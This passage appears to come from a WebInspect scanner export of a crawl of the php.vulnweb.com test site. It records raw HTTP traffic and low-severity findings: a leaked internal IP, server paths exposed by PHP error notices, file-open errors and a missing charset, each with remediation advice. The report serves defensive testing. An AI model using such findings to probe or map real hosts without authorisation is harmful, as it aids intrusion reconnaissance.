</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="F615DE426D88388DA2443306C2978F3F";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="d0f8070c";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="bd9cd13e";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[username=test
password=something]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:11 GMT</Value></Header><Header><Name>ETag</Name><Value>"4979a05e-21"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/plain</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Fri, 23 Jan 2009 10:47:58 GMT</Value></Header><Header><Name>Content-Length</Name><Value>33</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="5AFDA29FB84227B9F929C1414EC47B2B"><URL>http://php.vulnweb.com:80/pictures/ipaddresses.txt</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="e5f3a215-95d3-4895-b79b-d18c314af624"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>3508</VulnerabilityID><Severity>1</Severity><Name>Internal IP Disclosure</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="System Information Leak: Internal IP" href="https://vulncat.fortify.com/">System Information Leak: Internal IP</Classification><Classification kind="CWE" identifier="CWE-212" href="https://cwe.mitre.org/data/definitions/212.html">CWE-212: Improper Cross-boundary Removal of Sensitive Data</Classification></Classifications><DetectionSelection><Location offset="352" length="12" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A string matching an internal/reserved IPv4 or IPv6 address range was discovered. This may disclose information about the IP addressing scheme of the internal network and can be valuable to attackers.
Internal IPv4/IPv6 ranges are:<br />10.x.x.x<br />172.16.x.x through 172.31.x.x<br />192.168.x.x<br />fd00::x<br /> If not a part of techical documentation, recommendations include removing the string from the production server.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />
This issue can appear for several reasons. The most common is that the application or webserver error message discloses the IP address. This can be solved by determining where to turn off detailed error messages in the application or webserver. Another common reason is due to a comment located in the source of the webpage. This can easily be removed from the source of the page.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="5AFDA29FB84227B9F929C1414EC47B2B"><![CDATA[GET /pictures/ipaddresses.txt HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="5AFDA29FB84227B9F929C1414EC47B2B";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="13a177d6";
X-Request-Memo: ID="31e8fe5d";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:12 GMT
ETag: "4979bf3f-34"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/plain
Accept-Ranges: bytes
Last-Modified: Fri, 23 Jan 2009 12:59:43 GMT
Content-Length: 52

a
sa
s
as
sasaasas 192.168.0.26 asasas

asasas]]></RawResponse><Request id="5AFDA29FB84227B9F929C1414EC47B2B"><Method>GET</Method><Path>/pictures/</Path><File>ipaddresses</File><Ext>txt</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="5AFDA29FB84227B9F929C1414EC47B2B";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="13a177d6";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="31e8fe5d";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[a
sa
s
as
sasaasas 192.168.0.26 asasas

asasas]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:12 GMT</Value></Header><Header><Name>ETag</Name><Value>"4979bf3f-34"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/plain</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Fri, 23 Jan 2009 12:59:43 GMT</Value></Header><Header><Name>Content-Length</Name><Value>52</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="B6D9A705F9FF68FC5F72211FDD783E27"><URL>http://php.vulnweb.com:80/pictures/path-disclosure-unix.html</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="3f846f1d-5a99-49e5-bcc9-130610762fca"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /><Location offset="1014" length="40" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="af3aeba0-75be-4881-8da5-9b11f6fec835"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10026</EngineType><AttackHTTPRequest /><VulnerabilityID>10208</VulnerabilityID><Severity>1</Severity><Name>PHP Error Message</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="CWE" identifier="CWE-248" href="http://cwe.mitre.org/data/definitions/248.html">CWE-248: Uncaught Exception</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="2632" length="198" /><Location offset="3246" length="198" /><Location offset="3866" length="199" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A server error message was detected. Certain conditions, such as an application failure, will cause a server error message to be displayed. While error  messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems. Recommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />The page body contained an error message.  Knowing whether certain inputs trigger a server error can aid or inform an attacker of potential vulnerabilities.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations: </b><br /><br />Information on configuring PHP error messages can be found here: <a href="http://us.php.net/manual/en/ref.errorfunc.php">http://us.php.net/manual/en/ref.errorfunc.php</a>.<br /><br />Use these general recommendations when configuring error messages for display.  Also be advised that unknown application testing seeks to uncover new vulnerabilities in both custom and commercial software.  Please note that this vulnerability may be a false positive if the page it is flagged on is technical documentation.
<ul><li><b>Use Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For instance, don't reveal unintended information by using error messages such as Access Denied, which will also let an attacker know that the file he seeks actually exists. Use consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><li><b>Informational Error Messages:</b> Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as possible, and then add pieces of seemingly innocuous information together to craft an attack. </li><li><b>Proper Error Handling:</b> Use generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or other data that could be used by an attacker when orchestrating an attack. </li></ul><b>For Development:</b><br /><br />
This problem arises from the improper validation of characters that are accepted by the application. Any time a parameter is passed into a dynamically-generated web page, you must assume that the data could be incorrectly formatted. The application should contain sufficient logic to handle any situation in which a parameter is not being passed or is being passed incorrectly. Keep in mind how the data is being submitted, as a result of a GET or a POST. Additionally, to develop secure and stable code, treat cookies the same as parameters. The following recommendations will help ensure that you are delivering secure web applications.
<ul><li><b>Stringently define the data type:</b> Stringently define the data type (a string, an alphanumeric character, etc.) that the application will accept. Validate input for improper characters. Adopt the philosophy of using what is good rather than what is bad. Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. Define the maximum and minimum data lengths that the application will accept.</li><li><b>Verify parameter is being passed:</b> If a parameter that is expected to be passed to a dynamic Web page is omitted, the application should provide an acceptable error message to the user. Also, never use a parameter until you have verified that it has been passed into the application.</li><li><b>Verify correct format:</b> Never assume that a parameter is of a valid format. This is especially true if the parameter is being passed to a SQL database. Any string that is passed directly to a database without first being checked for proper format can be a major security risk. Also, just because a parameter is normally provided by a combo box or hidden field, do not assume the format is correct. A hacker will first try to alter these parameters while attempting to break into your site.</li><li><b>Verify file names being passed in via a parameter:</b> If a parameter is being used to determine which file to process, never use the file name before it is verified as valid. Specifically, test for the existence of characters that indicate directory traversal, such as .../, c:\, and /. </li><li><b>Do not store critical data in hidden parameters:</b> Many programmers make the mistake of storing critical data in a hidden parameter or cookie. They assume that since the user doesn't see it, it's a good place to store data such as price, order number, etc. Both hidden parameters and cookies can be manipulated and returned to the server, so never assume the client returned what you sent via a hidden parameter or cookie.</li></ul><b>For QA:</b><br /><br />
 From a testing perspective, ensure that the error handling scheme is consistent and does not reveal private information about your web application. A seemingly innocuous piece of information can provide an attacker the means to discover additional information that can be used to conduct an attack. Make the following observations:
<ul><li>Do you receive the same type of error for existing and non-existing files? </li><li>Does the error include phrases (such as "Permission Denied") that could reveal the existence of a file? </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Apache:</b><br /><a href="http://httpd.apache.org/docs/misc/security_tips.html">Security Tips for Server Configuration</a><br /><a href="http://www.w3.org/Security/faq/wwwsf3.html">Protecting Confidential Documents at Your Site</a><br /><a href="http://linux.omnipotent.net/article.php?article_id=3667">Securing Apache - Access Control</a><br /><br /><b>IIS:</b><br /><a href="http://www.microsoft.com/technet/prodtechnol/windowsserver2003/technologies/featured/iis/default.mspx">Implementing NTFS Standard Permissions on Your Web Site</a><br /><br /><b>General:</b><br /><a href="http://www.hwg.org/lists/hwg-servers/passwords.html">Password-protecting web pages</a><br /><a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/secmod/html/secmod71.asp">Web Security</a>]]></SectionText></ReportSection></Issue><Issue id="cb6dfce2-ca19-4c32-b29f-3d03ab2f7443"><CheckTypeID>Info</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest /><VulnerabilityID>10937</VulnerabilityID><Severity>0</Severity><Name>File Open Error Messages Detected</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="CWE" identifier="CWE-248" href="http://cwe.mitre.org/data/definitions/248.html">CWE-248: Uncaught Exception</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="2635" length="190" /><Location offset="3249" length="190" /><Location offset="3869" length="191" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Error messages related to opening files were detected. These errors may reveal include file names, file system paths or application execution details. Recommendations include resolving the program errors or restricting access to the programs effected.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Details of the application or system may be revealed through the error messages.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Click <a href="~FullURL~">~FullURL~</a> to verify the information in a web browser.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Resolve the file open errors through a program or permissions change. If necessary, remove the program or restrict access to it to keep the erorrs from being displayed.

]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="72c9311f-5b95-45f1-8674-618e35385dba"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11550</EngineType><AttackHTTPRequest /><VulnerabilityID>11359</VulnerabilityID><Severity>0</Severity><Name>Character Set Not Enforced</Name><Classifications><Classification kind="CWE" identifier="CWE-79" href="http://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</Classification><Classification kind="CWE" identifier="CWE-116" href="http://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</Classification><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Insecure Content-Type" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Insecure Content-Type Setting</Classification></Classifications><DetectionSelection><Location offset="228" length="9" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<br />The Content-Type HTTP response header or the HTML meta tag provides a mechanism for the server to specify an appropriate character encoding for the response content to be rendered in the web browser. Proper specification of the character encoding through the charset parameter in the Content-Type field reduces the likelihood of misinterpretation of the characters in the response content and ensure reliable rendering of the web page.
Failure to ensure enforcement of the desired character encoding could result in client-side attacks like Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />In the absence of the character set specification, a user-agent might default to a non-standard character set, or could derive an incorrect character set based on certain characters in the response content. In some cases, both these approaches can cause the response to be incorrectly rendered. This may enable other attacks such as Cross-site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Verify the character set specification on every HTTP response. Character sets can be specified in the HTTP header or in an HTML meta tag. In the case of an XML response, the character set can be specified along with the XML Declaration.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Ensure that a suitable character set is specified for every response generated by the web application. This can be done either by, 
<ul><li>Modifying the code of the web application, which would require all pages to be modified. 
</li><li>Adding Content-Type header to the server configuration (<b>recommended</b>). This ensures that the header is added to all the responses with minimal development effort.
</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>DoD Application Security and Development STIG</b><br /><a href="http://iase.disa.mil/stigs/app_security/app_sec/app_sec.html">http://iase.disa.mil/stigs/app_security/app_sec/app_sec.html</a><br /><br /><b>UTF-7 encoding used to create XSS attack</b><br /><a href="http://www.securityfocus.com/archive/1/420001">http://www.securityfocus.com/archive/1/420001</a><br /><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="B6D9A705F9FF68FC5F72211FDD783E27"><![CDATA[GET /pictures/path-disclosure-unix.html HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="B6D9A705F9FF68FC5F72211FDD783E27";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="ca230249";
X-Request-Memo: ID="6aaf5686";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:12 GMT
ETag: "516282e2-f60"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/html
Accept-Ranges: bytes
Last-Modified: Mon, 08 Apr 2013 08:42:10 GMT
Content-Length: 3936

<!-- en-t�te de page -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>

<title>Pierre&amp;Vacances</title>
<link rel="stylesheet" href="../medias/css/main.css">
<script language="JavaScript" src="../medias/js/common_functions.js"></script>

</head>

<body marginheight="0" marginwidth="0" topmargin="0" leftmargin="0">

<img src="../medias/img/pix.gif" width="1" height="5" alt=""><br>

<div class="titreArticle" style="height : 25px ;">&nbsp;&nbsp;&nbsp;R�servation locataire</div>
<!-- formulaire r�servation locataire -->
<!-- formulaire de fiche r�servation locataire -->
<br />
<b>Notice</b>:  Undefined index:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>15</b><br />
<br />
<b>Notice</b>:  Undefined index:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>18</b><br />

<br />
<b>Notice</b>:  Undefined property:  objObjectType in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>201</b><br />
<br />
<b>Notice</b>:  Undefined property:  objObjectType in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>205</b><br />
<br />

<b>Notice</b>:  Undefined property:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>210</b><br />
<br />
<b>Notice</b>:  Undefined property:  objObjectType in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>241</b><br />
<br />
<b>Notice</b>:  Undefined variable:  strXMLContent in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>314</b><br />

<br />
<b>Notice</b>:  Undefined variable:  strXMLContent in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>317</b><br />
<br />
<b>Notice</b>:  Undefined property:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>445</b><br />
<br />

<b>Warning</b>:  Sablotron error on line 1: XML parser error 3: no element found in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php</b> on line <b>70</b><br />
<br />
<b>Notice</b>:  Undefined index:  use_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>24</b><br />
<br />
<b>Notice</b>:  Undefined variable:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>34</b><br />

<br />
<b>Warning</b>:  Sablotron error on line 1: XML parser error 3: no element found in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php</b> on line <b>70</b><br />
<br />
<b>Notice</b>:  Undefined index:  ent_ancestor_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>45</b><br />
<br />

<b>Notice</b>:  Undefined index:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>56</b><br />
<br />
<b>Warning</b>:  Sablotron error on line 14: XML parser error 3: no element found in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php</b> on line <b>70</b><br />
<span  style="color=blue;font-size:9px;font-family:Verdana"><b>Erreur de transformation xslt :</b><br>&gt;&gt; N� : 2<br>&gt;&gt; Libell� : XML parser error 3: no element found<br></span>
]]></RawResponse><Request id="B6D9A705F9FF68FC5F72211FDD783E27"><Method>GET</Method><Path>/pictures/</Path><File>path-disclosure-unix</File><Ext>html</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="B6D9A705F9FF68FC5F72211FDD783E27";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="ca230249";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="6aaf5686";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!-- en-t�te de page -->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>

<title>Pierre&amp;Vacances</title>
<link rel="stylesheet" href="../medias/css/main.css">
<script language="JavaScript" src="../medias/js/common_functions.js"></script>

</head>

<body marginheight="0" marginwidth="0" topmargin="0" leftmargin="0">

<img src="../medias/img/pix.gif" width="1" height="5" alt=""><br>

<div class="titreArticle" style="height : 25px ;">&nbsp;&nbsp;&nbsp;R�servation locataire</div>
<!-- formulaire r�servation locataire -->
<!-- formulaire de fiche r�servation locataire -->
<br />
<b>Notice</b>:  Undefined index:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>15</b><br />
<br />
<b>Notice</b>:  Undefined index:  obj_id in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/pageMaker.class.php(84) : eval()'d code</b> on line <b>18</b><br />

<br />
<b>Notice</b>:  Undefined property:  objObjectType in <b>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</b> on line <b>201</b><br />
<br />
